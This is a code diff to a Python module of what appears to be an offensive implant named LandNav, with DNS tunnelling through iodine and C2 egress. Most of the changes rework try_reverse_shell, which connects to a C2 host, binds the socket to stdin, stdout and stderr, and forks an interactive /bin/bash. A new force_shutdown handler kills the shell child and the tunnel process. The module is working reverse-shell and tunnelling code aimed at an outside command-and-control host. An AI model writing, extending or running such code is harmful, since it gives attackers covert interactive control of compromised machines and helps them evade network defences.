@@ -18,6 +18,7 @@ import base64
 import logging
 import os
 import re
+import signal
 import shutil
 import socket
 import struct
@@ -41,7 +42,32 @@ class EgressState:
 _current_state = EgressState.IDLE
 _c2_process = None
 _c2_method = None
+_pty_child_pid = None          # Tracked so signal handler can kill it
 _watchdog_stop = threading.Event()
+
+
+def force_shutdown():
+    """Kill any blocking child (pty.spawn / iodine) so LandNav can exit.
+
+    Called from the signal handler — must be signal-safe (no logging).
+    """
+    global _current_state
+    _current_state = EgressState.FAILED
+    _watchdog_stop.set()
+
+    # Kill pty.spawn child (reverse shell)
+    if _pty_child_pid:
+        try:
+            os.kill(_pty_child_pid, signal.SIGKILL)
+        except OSError:
+            pass
+
+    # Kill iodine subprocess (dns tunnel)
+    if _c2_process:
+        try:
+            _c2_process.kill()
+        except OSError:
+            pass
 
 # ── DNS Tunnel (iodine) ────────────────────────────────────────
 
@@ -396,7 +422,7 @@ def try_reverse_shell(c2_host, ports, connect_timeout=10, proxy=None):
 
     Returns: True if shell connected (returns when shell ends)
     """
-    global _c2_method, _current_state
+    global _c2_method, _current_state, _pty_child_pid
 
     log.info("Attempting reverse shell to %s on ports %s", c2_host, ports)
 
@@ -420,28 +446,34 @@ def try_reverse_shell(c2_host, ports, connect_timeout=10, proxy=None):
             log.info("Reverse shell connected to %s:%d", c2_ip, port)
             _c2_method = "reverse_shell"
 
-            # Save original file descriptors so we can restore them
-            # after the shell exits — without this, LandNav's I/O is
-            # permanently destroyed (logging, reconnect all break).
-            saved_fds = (os.dup(0), os.dup(1), os.dup(2))
+            # Fork a child for the shell — parent keeps its own I/O
+            # intact and can be killed cleanly via signal handler.
+            s.settimeout(None)
+            child_pid = os.fork()
 
-            try:
-                # Redirect stdin/stdout/stderr to the socket
-                s.settimeout(None)
+            if child_pid == 0:
+                # ── Child: become the shell ──
                 os.dup2(s.fileno(), 0)
                 os.dup2(s.fileno(), 1)
                 os.dup2(s.fileno(), 2)
+                s.close()
+                os.execvp("/bin/bash", ["/bin/bash", "-i"])
+                os._exit(1)  # unreachable unless execvp fails
 
-                # Spawn shell — blocks until shell exits
-                import pty
-                pty.spawn("/bin/bash")
+            # ── Parent: wait for child ──
+            _pty_child_pid = child_pid
+            try:
+                while True:
+                    try:
+                        os.waitpid(child_pid, 0)
+                        break
+                    except InterruptedError:
+                        # Signal handler fired — retry waitpid to reap
+                        continue
+            except ChildProcessError:
+                pass  # Already reaped (killed by signal handler)
             finally:
-                # Restore original file descriptors no matter what
-                os.dup2(saved_fds[0], 0)
-                os.dup2(saved_fds[1], 1)
-                os.dup2(saved_fds[2], 2)
-                for fd in saved_fds:
-                    os.close(fd)
+                _pty_child_pid = None
                 try:
                     s.close()
                 except OSError:
